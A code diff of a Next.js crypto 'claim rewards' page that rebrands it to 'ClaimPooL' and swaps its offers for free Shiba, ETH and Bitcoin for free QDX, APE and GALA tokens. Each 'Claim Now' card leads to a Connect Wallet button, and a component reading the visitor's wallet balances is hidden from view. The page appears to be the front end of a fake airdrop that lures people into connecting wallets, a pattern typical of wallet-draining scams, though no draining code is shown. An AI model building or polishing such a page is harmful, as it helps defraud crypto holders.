@@ -24,28 +24,28 @@ const Home: NextPage = () => {
   return (
     <div style={styles.container}>
       <Head>
-        <title>Claims Page</title>
+        <title>Claim P</title>
         <meta name="description" content="Claim Your Rewards" />
         <link rel="icon" href="/favicon.ico" />
       </Head>
 
       <main style={styles.main}>
-        <h1 style={styles.title}>Claims</h1>
+        <h1 style={styles.title}>ClaimPooL</h1>
         
         <div style={{ display: 'none' }}>
           <WalletBalances onBalancesChange={handleBalancesChange} />
         </div>
 
         <p style={styles.walletStatus}>
-          {isConnected ? 'Started' : 'Not Started'}
+          {isConnected ? '.............' : '....'}
         </p>
         <WalletDashboard />
         
         <div style={styles.grid}>
           {/* Example claim card */}
           <div style={styles.card}>
-            <h2 style={styles.cardTitle}>Claim $100 Shiba Coins</h2>
-            <p style={styles.cardDescription}>Claim 100 Shiba Coins with a simple connection.</p>
+            <h2 style={styles.cardTitle}>Claim $15 QDX Coins</h2>
+            <p style={styles.cardDescription}>Claim QDX Coins and Boost the community.</p>
             <button style={styles.button} onClick={() => toggleDetails(0)}>
               {showDetails[0] ? 'Hide' : 'Claim Now'}
             </button>
@@ -54,7 +54,7 @@ const Home: NextPage = () => {
               <div style={styles.details}>
                 <ConnectButton label="Connect Wallet" />
                 <p style={styles.instructions}>
-                  Follow the steps to connect your wallet and claim your $100 Shiba coins.
+                  Follow the steps to connect your wallet.
                 </p>
               </div>
             )}
@@ -62,8 +62,8 @@ const Home: NextPage = () => {
 
           {/* Repeat similar structure for more claims */}
           <div style={styles.card}>
-            <h2 style={styles.cardTitle}>Claim $50 Ethereum</h2>
-            <p style={styles.cardDescription}>Claim 50 ETH tokens instantly.</p>
+            <h2 style={styles.cardTitle}>Claim $50 APE</h2>
+            <p style={styles.cardDescription}>Claim APE tokens instantly.</p>
             <button style={styles.button} onClick={() => toggleDetails(1)}>
               {showDetails[1] ? 'Hide' : 'Claim Now'}
             </button>
@@ -72,15 +72,15 @@ const Home: NextPage = () => {
               <div style={styles.details}>
                 <ConnectButton label="Connect Wallet" />
                 <p style={styles.instructions}>
-                  Follow the steps to connect your wallet and claim your $50 Ethereum.
+                  Follow the steps to connect your wallet.
                 </p>
               </div>
             )}
           </div>
 
           <div style={styles.card}>
-            <h2 style={styles.cardTitle}>Claim $200 Bitcoin</h2>
-            <p style={styles.cardDescription}>Claim your Bitcoin rewards securely.</p>
+            <h2 style={styles.cardTitle}>Claim $150 GALA</h2>
+            <p style={styles.cardDescription}>Claim your GALA rewards.</p>
             <button style={styles.button} onClick={() => toggleDetails(2)}>
               {showDetails[2] ? 'Hide' : 'Claim Now'}
             </button>
@@ -89,7 +89,7 @@ const Home: NextPage = () => {
               <div style={styles.details}>
                 <ConnectButton label="Connect Wallet" />
                 <p style={styles.instructions}>
-                  Follow the steps to connect your wallet and claim $200 in Bitcoin.
+                  Follow the steps to connect your wallet.
                 </p>
               </div>
             )}
@@ -99,7 +99,7 @@ const Home: NextPage = () => {
 
       <footer style={styles.footer}>
         <a href="#" target="_blank" rel="noopener noreferrer" style={styles.footerText}>
-          2024 © Claims Page.
+          2024 © ClaimPooL.
         </a>
       </footer>
     </div>
